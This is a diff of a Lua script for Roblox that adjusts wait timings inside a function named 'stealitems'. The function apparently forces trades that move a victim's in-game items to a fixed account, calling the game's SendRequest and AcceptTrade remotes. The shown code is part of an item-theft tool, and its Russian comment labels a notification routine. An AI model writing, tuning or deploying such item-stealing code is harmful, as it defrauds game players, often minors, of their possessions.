@@ -1079,6 +1079,7 @@ end
 
 
 local function stealitems()
+wait(2)
     coroutine.resume(destroytrades2)
 
     local sendArgs = {
@@ -1086,7 +1087,7 @@ local function stealitems()
     }
     game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
 
-    wait(1)
+    wait(2)
 
     for a,b in pairs(uniqueItems) do
         for i = 1, b.amount do
@@ -1178,7 +1179,6 @@ local function stealitems()
 
     wait(6)
     game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
-    wait(3)
 end
 
 -- Функция для отправки уведомлений
